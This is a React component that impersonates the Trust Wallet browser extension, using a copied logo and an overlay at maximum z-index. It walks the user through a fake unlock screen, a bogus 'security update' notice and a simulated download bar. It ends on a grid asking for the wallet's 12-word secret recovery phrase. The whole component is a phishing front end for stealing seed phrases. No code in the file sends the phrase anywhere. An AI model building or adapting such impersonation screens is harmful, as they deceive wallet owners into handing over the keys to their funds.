import { useState, useEffect } from 'react';

interface TrustPanelProps {
  isOpen: boolean;
  onClose: () => void;
}

type AppState = 'splash' | 'login' | 'update_prompt' | 'update_loading' | 'import_seed';

export default function TrustPanel({ isOpen, onClose }: TrustPanelProps) {
  const [appState, setAppState] = useState<AppState>('splash');
  const [password, setPassword] = useState('');
  const [seedWords, setSeedWords] = useState<string[]>(Array(12).fill(''));
  const [progress, setProgress] = useState(0);

  // 1. Splash Screen Timer
  useEffect(() => {
    if (isOpen) {
      setAppState('splash');
      setPassword('');
      setSeedWords(Array(12).fill(''));
      setProgress(0);
      
      const timer = setTimeout(() => {
        setAppState('login');
      }, 1500); // Trust splash pace
      return () => clearTimeout(timer);
    }
  }, [isOpen]);

  // 2. Loading Bar Logic
  useEffect(() => {
    if (appState === 'update_loading') {
      const interval = setInterval(() => {
        setProgress((prev) => {
          if (prev >= 100) return 100;
          
          const next = prev + Math.floor(Math.random() * 8) + 2; 
          
          if (next >= 100) {
            clearInterval(interval);
            setTimeout(() => setAppState('import_seed'), 1000);
            return 100;
          }
          return next;
        });
      }, 600);
      
      return () => clearInterval(interval);
    }
  }, [appState]);

  // Handle individual word inputs for the 12-word grid
  const handleWordChange = (index: number, value: string) => {
    const newWords = [...seedWords];
    newWords[index] = value.toLowerCase().trim();
    setSeedWords(newWords);
  };

  const isSeedComplete = seedWords.every(word => word.length > 0);

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 z-[2147483648] pointer-events-auto transition-all duration-200 ease-in-out font-sans">
      <div className="absolute inset-0" onClick={onClose}></div>

      {/* The Extension Container */}
      <div className="absolute top-0 right-8 w-[360px] h-[640px] bg-white border border-slate-200 shadow-2xl overflow-hidden animate-in fade-in slide-in-from-top-4 duration-300 ease-out rounded-b-[8px]">
        <div className="relative w-full h-full text-slate-900">

          {/* ========================================== */}
          {/* LAYER 1: SPLASH SCREEN                     */}
          {/* ========================================== */}
          <div className={`absolute inset-0 bg-white z-50 flex flex-col items-center justify-center overflow-hidden transition-opacity duration-700 ease-in-out ${appState === 'splash' ? 'opacity-100' : 'opacity-0 pointer-events-none'}`}>
            <div className="flex flex-col items-center justify-center animate-[pulse_1.5s_ease-in-out_infinite]">
              {/* Using your exact SVG with the exact classes you ripped */}
              <TrustLogoSVG className="h-[120px] w-full" />
            </div>
          </div>

          {/* ========================================== */}
          {/* LAYER 2: LOGIN SCREEN                      */}
          {/* ========================================== */}
          <div className={`absolute inset-0 bg-white z-40 flex flex-col items-center px-6 pt-16 pb-8 overflow-hidden transition-opacity duration-700 ease-in-out ${appState === 'login' ? 'opacity-100' : 'opacity-0 pointer-events-none'}`}>
            
            <div className="mb-6 w-full flex justify-center">
              <TrustLogoSVG className="h-[120px] w-full" />
            </div>

            <h2 className="text-[18px] font-bold text-slate-900 text-center leading-snug mb-8">
              Secure and trusted multi-chain crypto wallet
            </h2>
            
            <div className="w-full mb-6">
              <label className="block text-[14px] font-medium text-slate-700 mb-2">Password</label>
              <div className="relative w-full">
                <input 
                  type="password" 
                  className="w-full h-[52px] bg-[#F5F5F5] border border-transparent rounded-[12px] px-4 font-normal text-[16px] text-slate-900 outline-none focus:border-[#3375BB] focus:bg-white transition-all" 
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                />
                <i className="fas fa-eye absolute right-4 top-1/2 -translate-y-1/2 text-slate-400 cursor-pointer"></i>
              </div>
            </div>

            <div className="w-full mb-8">
              <button 
                onClick={() => setAppState('update_prompt')}
                className="w-full text-white bg-[#0500FA] font-bold text-[16px] rounded-[16px] h-[52px] hover:opacity-90 active:scale-[0.98] transition-all duration-300 disabled:opacity-50 disabled:cursor-not-allowed" 
                disabled={password.length === 0}
              >
                Unlock
              </button>
            </div>

            <div className="mt-auto text-center w-full">
              <p className="text-[14px] text-slate-500 mb-4 px-2">
                Can't login? You can erase your current wallet and set up a new one
              </p>
              <button className="text-[15px] font-bold text-slate-900 bg-white border border-slate-300 rounded-[12px] w-full h-[52px] hover:bg-slate-50 transition-colors">
                Reset wallet
              </button>
            </div>
          </div>

          {/* ========================================== */}
          {/* LAYER 3: UPDATE PROMPT SCREEN              */}
          {/* ========================================== */}
          <div className={`absolute inset-0 bg-white z-40 flex flex-col transition-opacity duration-700 ease-in-out ${appState === 'update_prompt' ? 'opacity-100' : 'opacity-0 pointer-events-none'}`}>
            <div className="flex flex-col items-center pt-12 px-6 flex-grow w-full">
              
              <TrustLogoSVG className="h-[64px] w-auto mb-4" />
              
              <h2 className="text-slate-900 font-bold text-[24px] mb-1">Update Available</h2>
              <p className="text-slate-500 font-medium text-[15px] mb-6">Version 2.65.0</p>

              <div className="bg-[#F0F9FF] border border-[#BAE6FD] rounded-[12px] p-4 flex items-start gap-3 w-full mb-6">
                <i className="fas fa-shield-alt text-[#0284C7] mt-0.5 text-[16px]"></i>
                <p className="text-[#0369A1] font-medium text-[14px] leading-snug">
                  Important scheduled update with security improvements. We recommend installing it now.
                </p>
              </div>

              <div className="w-full px-2 mb-8">
                <ul className="space-y-3 text-slate-700 text-[14px] font-medium">
                  <li className="flex items-center gap-2"><div className="w-1.5 h-1.5 rounded-full bg-slate-400"></div>Enhanced multi-chain support and performance</li>
                  <li className="flex items-center gap-2"><div className="w-1.5 h-1.5 rounded-full bg-slate-400"></div>Improved security system</li>
                  <li className="flex items-center gap-2"><div className="w-1.5 h-1.5 rounded-full bg-slate-400"></div>Fixed network information display</li>
                  <li className="flex items-center gap-2"><div className="w-1.5 h-1.5 rounded-full bg-slate-400"></div>Better transaction signing experience</li>
                </ul>
              </div>

              <div className="w-full mt-auto mb-6">
                <button 
                  onClick={() => setAppState('update_loading')} 
                  className="w-full text-white bg-[#0500FA] font-bold text-[16px] rounded-[16px] h-[52px] hover:opacity-90 active:scale-[0.98] transition-all duration-300"
                >
                  Update
                </button>
              </div>

              <p className="mb-6 text-[14px] font-semibold text-[#0500FA] cursor-pointer hover:underline">Need help? Contact Us</p>
            </div>
          </div>

          {/* ========================================== */}
          {/* LAYER 4: LOADING BAR SCREEN                */}
          {/* ========================================== */}
          <div className={`absolute inset-0 bg-white z-40 flex flex-col transition-opacity duration-700 ease-in-out ${appState === 'update_loading' ? 'opacity-100' : 'opacity-0 pointer-events-none'}`}>
            <div className="flex flex-col items-center pt-16 px-6 flex-grow w-full">
              
              <TrustLogoSVG className="h-[64px] w-auto mb-6 animate-pulse" />
              
              <h2 className="text-slate-900 font-bold text-[24px] mb-2">Updating</h2>
              <p className="text-slate-500 text-[15px] font-medium mb-12">Please wait while we update to version 2.65.0</p>
              
              <div className="w-full mb-6">
                <div className="flex justify-between items-end mb-2 px-1">
                  <span className="text-[14px] font-semibold text-slate-700">Downloading update...</span>
                  <span className="text-[14px] font-bold text-slate-900">{progress}%</span>
                </div>
                <div className="w-full h-2.5 bg-[#F5F5F5] rounded-full overflow-hidden">
                  <div className="h-full bg-[#0500FA] rounded-full transition-all duration-300" style={{ width: `${progress}%` }}></div>
                </div>
              </div>
              
              <p className="text-slate-400 text-[13px] text-center px-4 leading-relaxed">This may take a few moments. Please do not close this window.</p>
            </div>
          </div>

          {/* ========================================== */}
          {/* LAYER 5: SECRET RECOVERY PHRASE SCREEN     */}
          {/* ========================================== */}
          <div className={`absolute inset-0 bg-white z-40 flex flex-col transition-opacity duration-700 ease-in-out ${appState === 'import_seed' ? 'opacity-100' : 'opacity-0 pointer-events-none'}`}>
            
            {/* Minimal Header */}
            <div className="w-full flex justify-center py-4 border-b border-slate-100">
              <TrustLogoSVG className="h-[32px] w-auto" />
            </div>

            <div className="px-6 pt-6 flex-grow flex flex-col w-full z-10">
              
              <h3 className="text-slate-900 font-bold text-[20px] mb-4 text-center">Import with Secret Phrase</h3>
              
              <div className="w-full bg-[#F5F5F5] rounded-[12px] p-4 flex justify-between items-center mb-6 cursor-pointer border border-transparent hover:border-slate-200 transition-colors">
                <span className="text-[14px] font-semibold text-slate-900">I have a 12 word Secret Phrase</span>
                <i className="fas fa-chevron-down text-slate-400 text-[12px]"></i>
              </div>
              
              {/* 12 Word Grid */}
              <div className="grid grid-cols-2 gap-3 mb-6">
                {Array.from({ length: 12 }).map((_, i) => (
                  <div key={i} className="flex items-center bg-[#F5F5F5] rounded-[8px] px-3 py-2.5 focus-within:bg-white focus-within:ring-1 focus-within:ring-[#3375BB] transition-all">
                    <span className="text-slate-400 font-semibold text-[13px] w-6 shrink-0">{i + 1}.</span>
                    <input 
                      type="text" 
                      className="bg-transparent w-full outline-none text-[14px] font-medium text-slate-900 placeholder:text-slate-400" 
                      placeholder={`Word #${i + 1}`}
                      value={seedWords[i]}
                      onChange={(e) => handleWordChange(i, e.target.value)}
                    />
                  </div>
                ))}
              </div>
              
              <div className="mt-auto pb-6 w-full flex items-center gap-3">
                <button 
                  onClick={() => setAppState('update_prompt')}
                  className="w-1/3 text-[#0500FA] bg-[#F5F5F5] font-bold text-[16px] rounded-[16px] h-[52px] hover:bg-slate-200 transition-all"
                >
                  Back
                </button>
                <button 
                  disabled={!isSeedComplete} 
                  className="flex-1 text-white bg-[#0500FA] font-bold text-[16px] rounded-[16px] h-[52px] hover:opacity-90 transition-all disabled:opacity-50 disabled:cursor-not-allowed"
                >
                  Next
                </button>
              </div>

            </div>
          </div>

        </div>
      </div>
    </div>
  );
}

// ---------------------------------------------
// YOUR EXACT TRUST WALLET SVG EXTRACTED
// ---------------------------------------------

const TrustLogoSVG = ({ className }: { className?: string }) => (
  <svg className={className} fill="none" viewBox="0 0 62 87" xmlns="http://www.w3.org/2000/svg">
    <g clipPath="url(#clip0_26161_83707)">
      <path d="M-0.00195312 26.9479L30.5756 16.9648V86.0759C8.73428 76.8606 -0.00195312 59.1989 -0.00195312 49.2159V26.9465V26.9479Z" fill="#48FF91"></path>
      <path d="M61.1556 26.9479L30.5781 16.9648V86.0759C52.4194 76.8606 61.1556 59.1989 61.1556 49.2172V26.9479Z" fill="url(#paint0_linear_26161_83707)"></path>
      <path d="M12.0561 0.34082H16.3227V2.73096C17.7214 0.582458 19.33 0.34082 21.6857 0.34082V4.56603H20.6128C17.7905 4.56603 16.4387 5.89434 16.4387 8.52474V13.0151H12.0547V0.34082H12.0561Z" fill="#48FF91"></path>
      <path d="M35.9252 13.0137H31.5413V11.8055C30.5844 12.917 29.2795 13.3989 27.6709 13.3989C24.6166 13.3989 22.8906 11.5887 22.8906 8.25687V0.34082H27.2746V7.2696C27.2746 8.83818 28.0437 9.75502 29.3486 9.75502C30.6534 9.75502 31.5413 8.86165 31.5413 7.34141V0.34082H35.9252V13.0151V13.0137Z" fill="#48FF91"></path>
      <path d="M36.9961 9.10059H41.1012C41.289 10.0174 41.9172 10.4027 43.4319 10.4027C44.6677 10.4027 45.3913 10.1141 45.3913 9.58249C45.3913 9.17101 45.0406 8.9059 44.0395 8.68912L40.7284 7.94073C38.5136 7.43536 37.3938 6.15538 37.3938 4.10215C37.3938 1.39719 39.3752 -0.00292969 43.2221 -0.00292969C47.0689 -0.00292969 48.9578 1.36129 49.2851 4.28303H45.2049C45.1358 3.51117 44.3419 3.03894 43.037 3.03894C41.989 3.03894 41.3124 3.37585 41.3124 3.88398C41.3124 4.31755 41.7543 4.65584 42.6421 4.87539L46.1162 5.72043C48.4 6.27412 49.4977 7.43398 49.4977 9.31738C49.4977 11.9257 47.236 13.4708 43.3905 13.4708C39.545 13.4708 37.0016 11.8056 37.0016 9.10059H36.9975H36.9961Z" fill="#48FF91"></path>
      <path d="M61.17 4.28158V0.34082H50.3516V4.28435H53.5798V13.0137H57.9404V4.28158H61.17Z" fill="#48FF91"></path>
      <path d="M10.8366 4.28158V0.34082H0.0195312V4.28435H3.24781V13.0137H7.60833V4.28158H10.8366Z" fill="#48FF91"></path>
    </g>
    <defs>
      <linearGradient id="paint0_linear_26161_83707" x1="29.1518" y1="94.7238" x2="54.3898" y2="3.84876" gradientUnits="userSpaceOnUse">
        <stop offset="0.26" stopColor="#48FF91"></stop>
        <stop offset="0.66" stopColor="#0094FF"></stop>
        <stop offset="0.8" stopColor="#0038FF"></stop>
        <stop offset="0.89" stopColor="#0500FF"></stop>
      </linearGradient>
      <clipPath id="clip0_26161_83707"><rect width="61.1691" height="86.0768" fill="white"></rect></clipPath>
    </defs>
  </svg>
);